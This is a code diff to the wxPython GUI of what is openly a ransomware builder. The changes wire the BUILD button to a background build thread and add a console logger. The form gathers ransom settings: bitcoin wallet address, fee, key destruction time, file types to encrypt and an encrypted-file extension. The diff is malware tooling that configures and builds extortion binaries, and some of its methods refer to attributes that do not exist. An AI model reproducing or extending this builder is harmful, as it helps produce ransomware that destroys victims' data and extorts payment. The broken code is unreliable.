@@ -6,10 +6,14 @@
 
 # Import libs
 import wx
+from wx.lib.pubsub import setuparg1
+from wx.lib.pubsub import pub as Publisher
+import datetime
 
 # Import package modules
 from .BuilderGuiAbsBase import MainFrame
 from .Base import *
+from .BuilderThread import BuilderThread
 
 ###############
 ## GUI CLASS ##
@@ -19,17 +23,17 @@ class Gui(MainFrame):
     @summary: Provides a GUI object
     '''
     
-    def __init__(self, validate, config_dict):
+    def __init__(self, config_dict):
         '''
         @summary: Constructor
-        @param validate: Reference to the Builder validate method
         @param config_dict: The build configuration, if present
         '''
-        self.validate = validate
         self.language = DEFAULT_LANGUAGE
+        self.__builder = None
         
         # Init super - MainFrame
         MainFrame.__init__( self, parent=None )
+        self.console = Console(self.ConsoleTextCtrl)
         
         # Set initial event handlers
         self.set_events()
@@ -54,12 +58,6 @@ class Gui(MainFrame):
                     self.BuilderLanguageChoice.SetString(0, config_dict["builder_language"])
                     if config_dict["builder_language"] != self.language:
                         self.update_language(None, language=config_dict["builder_language"])
-            # Binary Language
-            if "binary_language" in config_dict:
-                if unicode(config_dict["binary_language"]) not in SUPPORTED_LANGUAGES:
-                    self.CrypterBinaryLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
-                else:
-                    self.CrypterBinaryLanguageChoice.SetString(0, config_dict["binary_language"])
             # Major Version
             if "maj_version" in config_dict:
                 self.MajorVersionTextCtrl.SetValue(config_dict["maj_version"])
@@ -111,7 +109,7 @@ class Gui(MainFrame):
         self.Bind(wx.EVT_CHOICE, self.update_language, self.BuilderLanguageChoice)
 
         # BUILD button
-        self.Bind(wx.EVT_BUTTON, self.__validate, self.BuildButton)
+        self.Bind(wx.EVT_BUTTON, self.__start_build, self.BuildButton)
         
         
     def update_language(self, event, language=None):
@@ -119,49 +117,126 @@ class Gui(MainFrame):
         @summary: Updates the Builder GUI language to the selected choice
         @param language: The language to change the form to. This is only provided when
         called directly, and not through a wx Event
+        @todo: Finish when support for multiple languages has been enabled for the Builder
         '''
         
         if not event:
             if language == "English":
                 self.language = "English"
                 #print("Changing language to English")
+                
+    def __get_timestamp(self):
+        '''
+        @summary: Return timestamp string
+        '''
+        
+        current_time = datetime.datetime.now()
+        time_output = "%s-%s-%s %s:%s:%s" % (
+            current_time.year,
+            current_time.month if current_time.month >= 10 else "0%s" % current_time.month,
+            current_time.day if current_time.day >= 10 else "0%s" % current_time.day,
+            current_time.hour if current_time.hour >= 10 else "0%s" % current_time.hour,
+            current_time.minute if current_time.minute >= 10 else "0%s" % current_time.minute,
+            current_time.second if current_time.second >= 10 else "0%s" % current_time.second
+            )
+                
+        return time_output
+
+
+    def __update_progress(self, msg):
+        '''
+        @summary: Updates the GUI with the build progress and status
+        @todo: Create logger method
+        '''
             
+        #self.ConsoleTextCtrl.AppendText((msg.data))
+        self.__console_log(_class=msg.data["_class"], msg=msg.data["msg"])
+        
+        # TODO If it's the thread update before the thread ends, set the Button back to "Build"
+        
+
+    def __stop_build(self, event):
+        '''
+        @summary: Method to terminate the build process
+        '''
+        
+        if self.__builder and self.__builder.is_in_progress():
+            self.__builder.stop()
 
         
-    def __validate(self, event):
+    def __start_build(self, event):
         '''
-        @summary: Validates the Build configuration input
+        @summary: Launches the validate and build processes
         '''
-        config_dict = {}
+        user_input_dict = {}
         
         # Read the form contents and pass to Builder validate
         # Major Version
-        config_dict["maj_version"] = self.MajorVersionTextCtrl.GetValue()
+        user_input_dict["maj_version"] = self.MajorVersionTextCtrl.GetValue()
         # Minor Version
-        config_dict["min_version"] = self.MinorVersionTextCtrl.GetValue()
+        user_input_dict["min_version"] = self.MinorVersionTextCtrl.GetValue()
         # Filename
-        config_dict["filename"] = self.FilenameTextCtrl.GetValue()
+        user_input_dict["filename"] = self.FilenameTextCtrl.GetValue()
         # Filename
-        config_dict["extension"] = self.ExtensionTextCtrl.GetValue()
+        user_input_dict["extension"] = self.ExtensionTextCtrl.GetValue()
         # PyInstaller AES Key
-        config_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
+        user_input_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
         # PyInstaller AES Key
-        config_dict["icon_file"] = self.IconFilePicker.GetPath()
+        user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
         # Encrypted File Extension
-        config_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
+        user_input_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
         # Wallet Address
-        config_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
+        user_input_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
         # Bitcoin Fee
-        config_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
+        user_input_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
         # Key Destruction Time
-        config_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
+        user_input_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
         # Max file size to encrypt
-        config_dict["max_file_size_to_encrypt"] = self.MaxFileSizeTextCtrl.GetValue()
+        user_input_dict["max_file_size_to_encrypt"] = self.MaxFileSizeTextCtrl.GetValue()
         # Max file size to encrypt
-        config_dict["filetypes_to_encrypt"] = self.FiletypesToEncryptTextCtrl.GetValue()
+        user_input_dict["filetypes_to_encrypt"] = self.FiletypesToEncryptTextCtrl.GetValue()
+        
+        # TODO Clear the Console
+        
+        
+        # Create listener and Launch the Build thread
+        Publisher.subscribe(self.__update_progress, "update")
+        self.__builder = BuilderThread(user_input_dict)
+        
+        # Change GUI BUILD button to STOP and bind to Stop method
+        self.BuildButton.SetLabel("STOP")
+        self.Bind(wx.EVT_BUTTON, self.__stop_build, self.BuildButton)
+        
+        
+###################
+## CONSOLE CLASS ##
+###################
+class Console():
+    '''
+    @summary: Provides an interface for the GUI Console window
+    '''
+    
+    def __init__(self, console):
+        '''
+        @summary: Constructor
+        @param console: Handle to the wxPython console TextCtrl
+        '''
+        self.__console_box = console
 
-        # Call validator
-        self.validate(config_dict)
+
+    def log(self, _class=None, msg=None):
+        '''
+        @summary: Logs output to the Console
+        @todo: What params to pass here? ... is there another way of doing this? can we inherit from this...
+        There may be a better way so that everyone has access to this class and it's methods
+        '''
+        
+        # Add the message to the Console box
+        self.ConsoleTextCtrl.AppendText("[%s]: %s: %s\n" % (self.__get_timestamp(),
+                                                            _class, 
+                                                            msg))
+
+            
     
     
     
